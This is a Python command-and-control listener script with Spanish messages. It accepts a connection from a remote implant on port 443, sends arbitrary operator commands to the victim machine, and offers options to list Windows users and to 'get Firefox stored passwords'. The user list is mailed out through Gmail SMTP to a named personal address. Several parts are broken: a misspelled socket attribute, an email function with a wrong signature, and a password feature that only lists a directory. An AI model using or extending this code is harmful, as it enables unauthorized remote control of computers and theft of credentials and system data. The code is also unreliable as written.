#!/usr/bin/env python3

import socket
import signal
from termcolor import colored
import sys
import smtplib
from email.mime.text import MIMEText

def def_handler(sig, frame):
    print(colored(f"\nSaliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:
    def __init__(self, ip, port):

       self.options = {"get users": "List system valid users (Gmail)", "get firefox": "Get Firefox Stored Passwords", "help": "Show this help panel"}

       server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,  1)
       server_socket.bind(("192.168.1.38", 443))
       server_socket.listen()

       print(f"\nListening for incoming connections...")

       self.client_socket, client_address = server_socket.accept()

       print(f"\nConnection established by {client_address}")

    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.slient_socket.recv(2048).decode()
 
        self.send_email("Users List Info -C2", output_command, "ikerbermejo02@gmail.com", ["ikerbermejo02@gmail.com"]) 

    def send_email(subject, body, sender, recipients, password):
          msg = MIMEText(body)   # Creating msg object using MIMEText class of email module
          msg['Subject'] = subject  # Assigning the subject
          msg['From'] = sender  # Assigning the sender email address
          msg['To'] = ', '.join(recipients)  # Assigning recepients email address.
          with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:   # Creating connection using context manager
             smtp_server.login(sender, password)
             smtp_server.sendmail(sender, recipients, msg.as_string())
          print(f"\nEmail sent Successfully!")


    def show_help(self):
        for key, value in self.options.items():
            print(f"\n{key} - {value}\n")

    def get_firefox_passwords(self):
        self.client_socket.send(b"dir C:\\Users\\iker\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        output_command = self.client_socket.recv(2048).decode()

        print(output_command)

    def run(self):
        while True:
            command = input("\n>> ")
            if command == "get users":
                self.get_users()

            elif command == "help":
                self.show_help()

            elif command == "get firefox":
                self.get_firefox_passwords()

            else:
               command_output = self.execute_remotely(command)
               print(command_output)

if __name__ == '__main__':
    my_listener = Listener("192.168.1.38", 443)
    my_listener.run()


